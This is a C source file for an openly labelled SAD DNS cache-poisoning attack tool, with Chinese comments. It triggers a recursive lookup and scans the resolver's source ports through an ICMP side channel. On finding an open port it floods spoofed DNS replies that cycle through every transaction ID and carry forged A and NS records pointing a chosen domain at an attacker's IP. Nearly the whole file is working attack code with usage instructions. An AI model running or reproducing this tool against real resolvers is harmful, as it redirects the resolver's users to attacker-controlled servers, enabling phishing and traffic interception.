// ======== saddns_attack_sender.c ========
/*
    SAD DNS (Side-channel AttackeD DNS) a resilient attack tool that leverages
    a high-performance, asynchronous sender framework.

    This implementation uses a "chunked burst" strategy to control the packet
    sending rate, preventing network congestion and increasing the probability
    of hitting the target's narrow race condition window.
*/

#include <pthread.h>
#include "util.h"
#include "network.h"
#include "dns.h"
#include "scanner.h"
#include "sender.h"
#include "strategy.h"
#include "common.h"

#define PACKETS_PER_CHUNK 128
#define BURST_INTERVAL_MS 10

unsigned int g_trigger_recur_query_interval = 1;
unsigned int g_icmp_limit                   = 50;
unsigned int g_start_scan_gap               = 2;
char*        g_poison_ns                    = "dns.google";

char*        g_recur_ip_in;
char*        g_recur_ip_out;
char*        g_scan_src_ip;
char*        g_poison_domain;
char*        g_poison_ip;
char**       g_ns_server_ip_arr;
unsigned int g_ns_server_ip_arr_count;
int          g_verbos = FALSE;
int          g_stop_flag = FALSE;

sender_t*    g_sender = NULL; 

typedef struct {
    char* src_ip;
    char* dst_ip;
    uint16_t dst_port;
    char* domain_name;
    char* poison_ip;
    char* poison_ns_name;
} saddns_task_args_t;

typedef struct {
    saddns_task_args_t* task_info;
    uint32_t packets_per_chunk;
    uint32_t* total_packets_sent; 
} chunked_make_args_t;

static void free_chunked_make_args(void* args) {
    if (!args) return;
    chunked_make_args_t* chunk_args = (chunked_make_args_t*)args;
    if (chunk_args->task_info) {
        saddns_task_args_t* task_info = chunk_args->task_info;
        free(task_info->src_ip);
        free(task_info->dst_ip);
        free(task_info->domain_name);
        free(task_info->poison_ip);
        free(task_info->poison_ns_name);
        free(task_info);
    }
    free(chunk_args);
}

bool make_saddns_spoof_chunk(packet_queue_t* queue, void* args) {
    chunked_make_args_t* chunk_args = (chunked_make_args_t*)args;
    saddns_task_args_t* task_args = chunk_args->task_info;

    if (*(chunk_args->total_packets_sent) > UINT16_MAX) {
        return false; 
    }

    struct dns_query* query[1];
    struct dns_answer* answer[1];
    struct dns_answer* authori[1];

    query[0] = new_dns_query_a(task_args->domain_name);
    answer[0] = new_dns_answer_a(task_args->domain_name, inet_addr(task_args->poison_ip), RES_TTL);
    authori[0] = new_dns_answer_ns(task_args->domain_name, task_args->poison_ns_name, RES_TTL);

    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, query, 1, answer, 1, authori, 1, TRUE);

    uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(task_args->src_ip),
                                            inet_addr(task_args->dst_ip),
                                            53, 
                                            task_args->dst_port,
                                            dns_payload, dns_payload_len);
    
    free(dns_payload);
    free_dns_query(query[0]);
    free_dns_answer(answer[0]);
    free_dns_answer(authori[0]);

    if (packet_raw_len == 0) {
        fprintf(stderr, "[-] Failed to create packet template.\n");
        free(packet_template);
        return false;
    }

    uint16_t start_txid = *(chunk_args->total_packets_sent);
    for (uint32_t i = 0; i < chunk_args->packets_per_chunk; ++i) {
        uint32_t current_txid_32 = start_txid + i;
        if (current_txid_32 > UINT16_MAX) {
            break;
        }
        
        packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
        new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;

        memcpy(new_pkt->data, packet_template, packet_raw_len);
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons((uint16_t)current_txid_32);
        
        // 将新数据包添加到队列尾部
        if (queue->head == NULL) {
            queue->head = new_pkt;
            queue->tail = new_pkt;
        } else {
            queue->tail->next = new_pkt;
            queue->tail = new_pkt;
        }
    }
    
    *(chunk_args->total_packets_sent) += chunk_args->packets_per_chunk;

    free(packet_template);
    return true;
}

static void spoof_callback_burst(uint16_t port) {
    printf("[Scanner CB] Open port found: %u. Launching chunked burst attack...\n", port);

    // 停止并清理之前的策略（如果存在）
    if (g_sender->strategy) {
        // sender_set_strategy 会负责释放旧策略及其 packet_args
        // 我们需要一个自定义的 free 函数来处理嵌套的内存
        chunked_make_args_t* old_args = (chunked_make_args_t*)g_sender->strategy->data;
        free_chunked_make_args(old_args);
        sender_set_strategy(g_sender, NULL); 
    }

    // 1. 创建共享的状态计数器
    uint32_t* total_packets_sent = malloc(sizeof(uint32_t));
    *total_packets_sent = 0;

    // 2. 创建本次攻击的静态任务信息
    // 为简化演示，我们只针对列表中的第一个 NS 服务器进行攻击
    saddns_task_args_t* task_info = malloc(sizeof(saddns_task_args_t));
    task_info->src_ip = _strdup(g_ns_server_ip_arr[0]);
    task_info->dst_ip = _strdup(g_recur_ip_out);
    task_info->dst_port = port;
    task_info->domain_name = _strdup(g_poison_domain);
    task_info->poison_ip = _strdup(g_poison_ip);
    task_info->poison_ns_name = _strdup(g_poison_ns);
    
    // 3. 创建将传递给 make 函数的最终参数
    chunked_make_args_t* make_args = malloc(sizeof(chunked_make_args_t));
    make_args->task_info = task_info;
    make_args->packets_per_chunk = PACKETS_PER_CHUNK;
    make_args->total_packets_sent = total_packets_sent;

    // 4. 创建 burst 策略，配置为周期性地调用我们的分块函数
    sender_strategy_t* strategy = create_strategy_burst(
        default_init,
        default_free,
        make_saddns_spoof_chunk, // 使用分块生成函数
        make_args,               // 传递包含状态的参数
        NULL,
        NULL,
        NULL,                    // 使用默认发送逻辑
        NULL,
        0,                       // 立即开始
        BURST_INTERVAL_MS        // 周期性重复
    );

    // 5. 设置并启动 sender 执行新策略
    sender_set_strategy(g_sender, strategy);
    sender_start(g_sender);
}

// 触发查询的线程 (与原文件逻辑一致)
static void* trigger_recur_query_thread(void* stop_flag_ptr) {
    if (!(*(int*)stop_flag_ptr)) {
        printf("[*] trigger_recur_query_thread: Sending a SINGLE query to trigger the attack window.\n");
        send_dns_query(g_recur_ip_in, g_poison_domain, g_trigger_recur_query_interval);
        printf("[*] trigger_recur_query_thread: Single query sent. Thread will now exit.\n");
    }
    return NULL;
}

// 主攻击流程
static void attack() {
    scan_init();
    scan_set_ignore_dns_port(FALSE);
    scan_set_scan_callback(spoof_callback_burst); // 设置新的回调

    pthread_t query_thread;
    printf("[*] Triggering recursive query in a separate thread...\n");
    pthread_create(&query_thread, NULL, trigger_recur_query_thread, &g_stop_flag);

    sleep(g_start_scan_gap);

    printf("[*] Starting port scan. An attack strategy will be launched upon finding an open port.\n");
    scan(g_scan_src_ip, g_recur_ip_out, 40000, 45000, g_icmp_limit, g_verbos, &g_stop_flag);
    
    printf("[*] Port scan finished.\n");
    g_stop_flag = TRUE;
    pthread_join(query_thread, NULL);
    
    // 扫描结束后，不主动停止 sender，让其继续完成后台的发送任务
    // 用户通过 Ctrl+C 来终止整个程序
    printf("[*] Scan complete. Sender may still be processing tasks. Press Ctrl+C to exit.\n");
}

// 信号处理，用于优雅地停止
static void on_signal(uv_signal_t* handle, int signum) {
    sender_t* sender = (sender_t*)handle->data;
    printf("\n[Signal Handler] Caught signal %d. Stopping scan and sender...\n", signum);
    g_stop_flag = TRUE; // 确保扫描循环（如果还在运行）会停止
    uv_async_send(sender->stop_async); // 请求 sender 停止，最终会停止 uv_run
    uv_signal_stop(handle);
}

int main(int argc, char** argv) {
    int ch;
    char* ns_server_ip_list = NULL;

    while ((ch = getopt(argc, argv, "i:o:s:u:d:a:v")) != -1) {
        switch (ch) {
            case 'i': g_recur_ip_in = optarg; break;
            case 'o': g_recur_ip_out = optarg; break;
            case 's': g_scan_src_ip = optarg; break;
            case 'u': ns_server_ip_list = optarg; break;
            case 'd': g_poison_domain = optarg; break;
            case 'a': g_poison_ip = optarg; break;
            case 'v': g_verbos = TRUE; break;
            default: printf("Unknown arg\n"); return 1;
        }
    }

    if (!g_recur_ip_in || !g_recur_ip_out || !g_scan_src_ip || !ns_server_ip_list || !g_poison_domain || !g_poison_ip) {
        printf("Usage:\n");
        printf("./saddns_attack_sender -i <recur_ip_in> -o <recur_ip_out> -s <scan_src_ip> -u <ns1:ns2> -d <domain_to_poison> -a <ip_to_poison_to> [-v]\n");
        return 1;
    }

    dns_init();
    uv_loop_t* loop = uv_default_loop();

    g_ns_server_ip_arr = (char**)alloc_memory(512);
    g_ns_server_ip_arr_count = strtok_ex(g_ns_server_ip_arr, 512, ns_server_ip_list, ":");

    sender_t my_sender;
    if (sender_init(&my_sender, loop, "192.168.3.144", 1234) != 0) {
        fprintf(stderr, "Failed to initialize sender\n");
        return 1;
    }
    g_sender = &my_sender;
    printf("[+] Sender initialized and ready.\n");

    uv_signal_t signal_handle;
    uv_signal_init(loop, &signal_handle);
    signal_handle.data = &my_sender;
    uv_signal_start(&signal_handle, on_signal, SIGINT);
    
    printf("[*] Starting attack sequence...\n");
    attack();

    uv_run(loop, UV_RUN_DEFAULT);
    
    printf("[*] Event loop stopped. Cleaning up resources...\n");
    sender_free(&my_sender);
    uv_run(loop, UV_RUN_ONCE);
    uv_loop_close(loop);
    free(g_ns_server_ip_arr);

    printf("[*] Finished.\n");
    return 0;
}